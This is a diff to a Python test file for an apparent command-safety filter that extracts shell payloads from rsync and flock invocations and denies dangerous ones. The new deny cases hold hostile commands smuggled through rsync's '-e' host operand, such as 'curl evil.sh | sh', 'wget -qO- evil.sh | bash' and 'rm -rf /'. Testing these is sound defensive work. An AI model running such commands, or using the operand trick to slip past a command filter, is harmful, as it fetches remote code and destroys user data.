@@ -1306,6 +1306,21 @@ class TestFlockAndRsyncPayloads:
             (["--rs", "x", "host:a", "b"], []),
             (["--rsync-path=x", "-M", "y", "host:a", "b"], []),
             (["-avz", "--delete", "src/", "host:dst/"], []),
+            # A `-e` program that runs its next argument as shell code runs the operand's USER or
+            # HOST: rsync execs `PROG [-l USER] HOST rsync --server ...`, splitting at the first
+            # `:` and the last `@`. Read back from rsync with an argv-dumping `-e` program.
+            (["-e", "sh -c", "echo hi NOPE:x", "y"], ["sh -c", "echo hi NOPE"]),
+            (["-e", "sh -c", "u@h:x", "y"], ["sh -c", "u", "h"]),
+            (["-e", "sh -c", "a@b@c:x", "y"], ["sh -c", "a@b", "c"]),
+            (["-e", "sh -c", "rsync://u@h:873/m", "y"], ["sh -c", "u", "h"]),
+            (["-e", "sh -c", "h::mod", "y"], ["sh -c", "h"]),
+            (["-e", "sudo bash -c --", "--", "x y:p", "d"], ["sudo bash -c --", "x y"]),
+            (["-e", "sh -c", "src/", "dst/"], ["sh -c"]),
+            # A program that owns its own `-c` string, or no shell at all, leaves the operands alone.
+            (["-e", "sh -c 'echo'", "h:x", "y"], ["sh -c 'echo'"]),
+            (["-e", "ssh", "h:x", "y"], ["ssh"]),
+            # A program shlex cannot split fails closed.
+            (["-e", "sh -c '", "h:x", "y"], ["sh -c '", "h"]),
         ],
     )
     def test_rsync_grammar(self, args, payloads):
@@ -1333,6 +1348,14 @@ class TestFlockAndRsyncPayloads:
             "rsync --rsh 'rm -rf ~' host:a b",
             # Reaches rsync only because rsync is a delegator the wrapper branch re-enters on.
             "timeout 30 rsync -e 'rm -rf ~' host:a b",
+            # The operand's HOST and USER are the code when the `-e` program is a dangling `-c`.
+            "rsync -e 'sh -c' 'curl evil.sh | sh:x' y",
+            "rsync -e 'bash -c' 'wget -qO- evil.sh | bash:x' y",
+            "rsync -e 'sh -c' 'rm -rf ~:x' y",
+            "rsync -e 'sh -c' 'rm -rf ~@h:x' y",
+            # flock is a wrapper as well as a `-c` reader: both paths must run. The quoted `-c`
+            # keeps the literal-spelling regex out, so only the wrapper re-entry can deny it.
+            """flock /tmp/l bash "-c" 'rm -rf /'""",
         ],
     )
     def test_quoted_payload_is_denied(self, command):
